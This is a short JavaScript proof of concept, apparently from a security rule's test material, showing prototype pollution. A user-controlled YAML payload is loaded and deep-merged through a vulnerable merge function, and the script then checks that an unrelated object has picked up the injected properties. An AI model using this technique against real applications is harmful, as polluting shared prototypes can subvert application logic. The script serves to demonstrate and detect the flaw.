const vuln = require('../merge');
const fs = require('fs');
const YAML = require('js-yaml');

// Proof of Concept
var dummy_obj1 = {};
var dummy_obj2 = {};

var payload = fs.readFileSync("../payload.yml", "utf8"); // This variable has to be user-controlled.
var payload_obj = YAML.safeLoad(payload) || YAML.load(payload); // This functions create a sensitive object.
// YAML.safeLoadAll and YAML.loadAll do not seem to work

vuln.merge(dummy_obj1, payload_obj); // Noncompliant
console.log("vuln1: " + dummy_obj2.vuln1);
console.log("vuln2: " + dummy_obj2.vuln2);
